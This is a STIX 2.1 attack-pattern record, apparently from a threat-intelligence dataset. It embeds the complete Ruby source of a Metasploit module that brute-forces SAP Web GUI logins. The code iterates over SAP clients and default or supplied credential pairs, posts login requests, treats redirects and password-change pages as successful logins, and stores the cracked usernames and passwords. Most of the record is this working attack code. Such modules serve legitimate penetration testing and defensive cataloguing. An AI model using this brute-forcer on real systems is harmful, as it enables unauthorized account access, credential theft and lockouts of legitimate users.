{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--7f168410-8048-40e6-8f62-71219d24333d",
    "created": "2024-08-14T16:27:01.278979Z",
    "modified": "2024-08-14T16:27:01.278983Z",
    "name": "SAP Web GUI Login Brute Forcer",
    "description": " This module attempts to brute force SAP username and passwords through the SAP Web GUI service. Default clients can be\ttested without needing to set a CLIENT. Common and default user/password combinations can be tested just setting the DEFAULT_CRED variable to true. The MSF_DATA_DIRECTORY/wordlists/sap_default.txt path store stores these default combinations.  'References' => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/sap/sap_web_gui_brute_login.rb",
            "external_id": "sap_web_gui_brute_login.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n##\n# This module is based on, inspired by, or is a port of a plugin available in\n# the Onapsis Bizploit Opensource ERP Penetration Testing framework -\n# http://www.onapsis.com/research-free-solutions.php.\n# Mariano Nunez (the author of the Bizploit framework) helped me in my efforts\n# in producing the Metasploit modules and was happy to share his knowledge and\n# experience - a very cool guy. I'd also like to thank Chris John Riley,\n# Ian de Villiers and Joris van de Vis who have Beta tested the modules and\n# provided excellent feedback. Some people just seem to enjoy hacking SAP :)\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n  include Msf::Auxiliary::AuthBrute\n\n  def initialize\n    super(\n      'Name' => 'SAP Web GUI Login Brute Forcer',\n      'Description' => %q{\n        This module attempts to brute force SAP username and passwords through the SAP Web\n        GUI service. Default clients can be\ttested without needing to set a CLIENT. Common\n        and default user/password combinations can be tested just setting the DEFAULT_CRED\n        variable to true. The MSF_DATA_DIRECTORY/wordlists/sap_default.txt path store\n        stores these default combinations.\n      },\n      'References' =>\n        [\n          [ 'URL', 'https://labs.f-secure.com/tools/sap-metasploit-modules/' ]\n        ],\n      'Author' =>\n        [\n          'nmonkee'\n        ],\n      'License' => MSF_LICENSE\n\n    )\n    register_options(\n      [\n        Opt::RPORT(8000),\n        OptString.new('TARGETURI', [true, 'URI', '/']),\n        OptString.new('CLIENT', [false, 'Client can be single (066), comma separated list (000,001,066) or range (000-999)', '000,001,066']),\n        OptBool.new('DEFAULT_CRED',[false, 'Check using the default password and username',true]),\n        OptString.new('USERPASS_FILE',[false, '',nil])\n      ])\n  end\n\n  def run_host(ip)\n    uri = target_uri.to_s\n    if datastore['CLIENT'].nil?\n      print_status(\"Using default SAP client list\")\n      client = ['000','001','066']\n    else\n      client = []\n      if datastore['CLIENT'] =~ /^\\d{3},/\n        client = datastore['CLIENT'].split(/,/)\n        print_status(\"Brute forcing clients #{datastore['CLIENT']}\")\n      elsif datastore['CLIENT'] =~ /^\\d{3}-\\d{3}\\z/\n        array = datastore['CLIENT'].split(/-/)\n        client = (array.at(0)..array.at(1)).to_a\n        print_status(\"Brute forcing clients #{datastore['CLIENT']}\")\n      elsif datastore['CLIENT'] =~ /^\\d{3}\\z/\n        client.push(datastore['CLIENT'])\n        print_status(\"Brute forcing client #{datastore['CLIENT']}\")\n      else\n        print_status(\"Invalid CLIENT - using default SAP client list instead\")\n        client = ['000','001','066']\n      end\n    end\n    saptbl = Msf::Ui::Console::Table.new( Msf::Ui::Console::Table::Style::Default,\n      'Header'  => \"[SAP] Credentials\",\n      'Prefix'  => \"\\n\",\n      'Postfix' => \"\\n\",\n      'Indent'  => 1,\n      'Columns' => [\"host\",\"port\",\"client\",\"user\",\"pass\"])\n\n\n    if datastore['DEFAULT_CRED']\n      credentials = extract_word_pair(Msf::Config.data_directory + '/wordlists/sap_default.txt')\n      credentials.each do |u, p|\n        client.each do |cli|\n          success = bruteforce(uri, u, p, cli)\n          if success\n            saptbl << [ rhost, rport, cli, u, p]\n          end\n        end\n      end\n    end\n    each_user_pass do |u, p|\n      client.each do |cli|\n        success = bruteforce(uri, u, p, cli)\n        if success\n          saptbl << [ rhost, rport, cli, u, p]\n        end\n      end\n    end\n    print(saptbl.to_s)\n\n  end\n\n  def report_cred(opts)\n    service_data = {\n      address: opts[:ip],\n      port: opts[:port],\n      service_name: opts[:service_name],\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      origin_type: :service,\n      module_fullname: fullname,\n      username: opts[:user],\n      private_data: opts[:password],\n      private_type: :password\n    }.merge(service_data)\n\n    login_data = {\n      last_attempted_at: Time.now,\n      core: create_credential(credential_data),\n      status: Metasploit::Model::Login::Status::SUCCESSFUL,\n      proof: opts[:proof]\n    }.merge(service_data)\n\n    create_credential_login(login_data)\n  end\n\n  def bruteforce(uri,user,pass,cli)\n    begin\n      path = \"sap/bc/gui/sap/its/webgui/\"\n      cookie = \"Active=true; sap-usercontext=sap-language=EN&sap-client=#{cli}\"\n      res = send_request_cgi({\n        'uri'    => \"#{uri}#{path}\",\n        'method' => 'POST',\n        'cookie' => cookie,\n        'vars_post' => {\n          'sap-system-login-oninputprocessing' => 'onLogin',\n          'sap-urlscheme' => '',\n          'sap-system-login' => 'onLogin',\n          'sap-system-login-basic_auth' => '',\n          'sap-system-login-cookie_disabled' => '',\n          'sysid' => '',\n          'sap-client' => cli,\n          'sap-user' => user,\n          'sap-password' => pass,\n          'sap-language' => 'EN'\n          }\n        })\n    rescue ::Rex::ConnectionError, Errno::ECONNREFUSED, Errno::ETIMEDOUT\n      print_error(\"[SAP] #{rhost}:#{rport} - Service failed to respond\")\n      return false\n    end\n\n    if res and res.code == 302\n      report_cred(\n        ip: rhost,\n        port: rport,\n        service_name: 'sap_webgui',\n        user: user,\n        password: pass,\n        proof: \"SAP Client: #{cli}\"\n      )\n      return true\n    elsif res and res.code == 200\n      if res.body =~ /log on again/\n        return false\n      elsif res.body =~ /<title>Change Password - SAP Web Application Server<\\/title>/\n        report_cred(\n          ip: rhost,\n          port: rport,\n          service_name: 'sap_webgui',\n          user: user,\n          password: pass,\n          proof: \"SAP Client: #{cli}\"\n        )\n        return true\n      elsif res.body =~ /Password logon no longer possible - too many failed attempts/\n        print_error(\"[SAP] #{rhost}:#{rport} - #{user} locked in client #{cli}\")\n        return false\n      end\n    else\n      print_error(\"[SAP] #{rhost}:#{rport} - error trying #{user}/#{pass} against client #{cli}\")\n      return false\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ]
}